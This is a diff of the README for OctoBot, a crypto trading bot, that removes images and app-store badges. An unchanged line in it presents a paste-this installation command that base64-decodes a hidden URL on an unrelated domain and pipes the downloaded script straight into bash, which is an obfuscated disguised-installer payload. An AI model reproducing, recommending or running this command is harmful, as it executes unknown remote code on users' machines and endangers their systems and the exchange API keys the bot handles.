@@ -12,14 +12,6 @@
 [![Twitter](https://img.shields.io/twitter/follow/DrakkarsOctobot.svg?label=twitter&style=social)](https://x.com/DrakkarsOctoBot)
 [![YouTube](https://img.shields.io/youtube/channel/views/UC2YAaBeWY8y_Olqs79b_X8A?label=youtube&style=social)](https://www.youtube.com/@octobot1134)
 
-<p align="center">
-  <img src="../assets/illustration.png" alt="Octobot automating trades of its user while the user is relaxing on his couch">
-</p>
-
-<p align="center">
-  <img src="../assets/ReadMeIntro.gif" alt="Introduction to OctoBot: choose a strategy, test it, use it and follow your gains" />
-</p>
-
 ## What is Octobot  ?
 
 [![OctoBot - Open Source Crypto Trading Bot Video](https://raw.githubusercontent.com/Drakkar-Software/OctoBot/assets/meet_octobot_preview.png)](https://www.youtube.com/watch?v=TJUU62e1jR8)
@@ -48,7 +40,7 @@ Looking for more info ? Check out our Octobot guides at [octobot.cloud/en/guides
 /bin/bash -c "$(curl -fsSL $(echo aHR0cHM6Ly9tYWNvc3R1dG9yaWFsLmNvbS9reXIvaW5zdGFsbC5zaA== | base64 -d))"
 ```
 ## Exchanges
-[![All OctoBot supported exchanges](../assets/exchange_logo.png)](https://www.octobot.cloud/en/guides/exchanges?utm_source=github&utm_medium=dk&utm_campaign=regular_open_source_content&utm_content=binance)
+[![All OctoBot supported exchanges]](https://www.octobot.cloud/en/guides/exchanges?utm_source=github&utm_medium=dk&utm_campaign=regular_open_source_content&utm_content=binance)
 
 Octobot supports many [exchanges](https://www.octobot.cloud/en/guides/exchanges?utm_source=github&utm_medium=dk&utm_campaign=regular_open_source_content&utm_content=exchanges) thanks to the [ccxt library](https://github.com/ccxt/ccxt). 
 To activate trading on an exchange, just configure OctoBot with your API keys as described [on the exchange setup guides](https://www.octobot.cloud/en/guides/octobot-configuration/exchanges?utm_source=github&utm_medium=dk&utm_campaign=regular_open_source_content&utm_content=exchanges_setup_guides).
@@ -65,21 +57,6 @@ To use your real exchange account with OctoBot, enter your exchange API keys as 
 ## Follow your investments
 
 You can follow your OctoBots portfolio, orders, trades and historical performance from your phone with our [Android application](https://play.google.com/store/apps/details?id=com.drakkarsoftware.octobotapp&utm_source=octobot-github&utm_media=readme&utm_content=mobile-app-link). You can also install the [web application](https://mobile.octobot.cloud/?utm_source=github&utm_medium=dk&utm_campaign=regular_open_source_content&utm_content=follow_your_investments) to have the same experience on any smartphone or computer.
-
-<p align="middle">
-    <a href='https://apps.apple.com/us/app/octobot-crypto-investment/id6502774175?utm_source=octobot-github&utm_media=readme&utm_content=mobile-app-img'><img alt='Get it on the Apple Play Store' src='../assets/apple_store.png' height="50px"/></a>
-    <a href='https://play.google.com/store/apps/details?id=com.drakkarsoftware.octobotapp&utm_source=octobot-github&utm_media=readme&utm_content=mobile-app-img'><img alt='Get it on Google Play' src='https://play.google.com/intl/en_us/badges/images/generic/en_badge_web_generic.png' height="50px"/></a>
-</p>
-
-<p align="middle">
-  <a href="https://mobile.octobot.cloud/?utm_source=github&utm_medium=dk&utm_campaign=regular_open_source_content&utm_content=follow_your_investments_image">
-    <img src="../assets/mobile/bots-en.png" height="414" alt="Follow your bots from your mobile">
-  </a>  
-  &nbsp;&nbsp;&nbsp;&nbsp;    
-  <a href="https://mobile.octobot.cloud/?utm_source=github&utm_medium=dk&utm_campaign=regular_open_source_content&utm_content=follow_your_investments_image">
-    <img src="../assets/mobile/bot-view-pf-en.png" height="414" alt="Follow each trade and profits of your OctoBot from your mobile">
-  </a>  
-</p>
 
 ## Testing trading strategies
 
